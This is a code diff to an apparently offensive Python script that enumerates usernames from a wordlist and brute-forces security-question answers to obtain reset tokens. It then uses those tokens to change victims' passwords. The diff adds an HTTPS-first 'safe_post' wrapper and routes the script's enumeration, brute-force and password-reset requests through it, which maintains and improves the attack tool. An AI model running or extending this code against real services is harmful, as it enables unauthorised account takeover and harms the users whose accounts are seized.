@@ -2,6 +2,25 @@ import copy
 import requests
 import sys
 
+
+def safe_post(url, **kwargs):
+    """Attempt to use HTTPS for the given URL and fall back to HTTP on failure.
+    This preserves original behaviour if HTTPS is not available while protecting sensitive data when TLS is supported.
+    """
+    try:
+        if isinstance(url, str) and url.startswith('http://'):
+            https_url = 'https://' + url.split('://', 1)[1]
+            try:
+                return requests.post(https_url, **kwargs)
+            except Exception:
+                # HTTPS failed, fall back to original HTTP URL to preserve functionality
+                return requests.post(url, **kwargs)
+        else:
+            return requests.post(url, **kwargs)
+    except Exception:
+        # Propagate exceptions to preserve original error behaviour
+        raise
+
 QUESTIONS = [
     "How old are you?",
     "What is your birthday?",
@@ -82,7 +101,7 @@ def enumerate(atk, rota):
         for line in wordlist:
             line = line[:-1]
             c[v] = line
-            response = requests.post(url, json = c)
+            response = safe_post(url, json = c)
             if response.status_code == success_code:
                 print(f"{Colors.OKGREEN}[SUCCESS]: {line}")
                 count_users[1] += 1
@@ -105,7 +124,7 @@ def brute_force(atk, user):
     if atk == "2":
         content_one = copy.deepcopy(ATTACKS[atk]["contents"]["userinfo"])
         content_one["login"] = user
-        json_response = requests.post(ATTACKS[atk]["urls"]["userinfo"], json = content_one).json()
+        json_response = safe_post(ATTACKS[atk]["urls"]["userinfo"], json = content_one).json()
         try:
             if 'message' in json_response and json_response['message'] == 'invalid login':
                 print(f"{Colors.FAIL}[FAIL] User does not exist.")
@@ -129,12 +148,12 @@ def brute_force(atk, user):
                     count+=1
                     content["firstAnswer"] = a0[:-1]
                     content["secondAnswer"] = a1[:-1]
-                    response = requests.post(url, json = content)
+                    response = safe_post(url, json = content)
                     print(f"Testados: {count}", end='\r')
                     if response.status_code == 200:
                         print(f"{Colors.OKGREEN}[SUCCESS]{Colors.NORMAL} Token: {response.json()['token']}")
                         new_password = input(f"{Colors.YELLOW}Insert new password: {Colors.YELLOW}")
-                        r = requests.post(ATTACKS[atk]["urls"]["reset"], json = {"password": new_password, "repeatPassword": new_password}, headers={'Authorization': f"Bearer {response.json()['token']}"}).json()
+                        r = safe_post(ATTACKS[atk]["urls"]["reset"], json = {"password": new_password, "repeatPassword": new_password}, headers={'Authorization': f"Bearer {response.json()['token']}"}).json()
                         if "message" in r and r["message"] == "success":
                             print(f"{Colors.OKGREEN}[SUCCESS]{Colors.NORMAL} Password changed.")
                             return
